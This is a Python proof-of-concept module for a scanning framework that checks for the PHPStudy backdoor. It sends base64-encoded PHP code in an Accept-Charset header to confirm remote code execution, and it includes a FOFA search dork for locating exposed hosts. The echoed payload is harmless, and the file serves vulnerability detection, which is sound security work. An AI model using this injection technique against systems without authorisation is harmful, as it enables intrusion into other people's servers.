# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3,base64
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "PHPStudy 后门检测",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "phpstudy",                     # 漏洞应用名称
        "AppVersion" : "phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            我直接抄了：
            2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，
            疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，
            查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，
            鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。
            在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            "phpstudy"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "" # url自己按需调整
        rnd=random_str()

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    'Accept-Encoding':'gzip,deflate',
                    "accept-charset":str(base64.b64encode("echo \"{rnd}\";".format(rnd=rnd).encode("utf-8")),"utf-8")
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if rnd in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()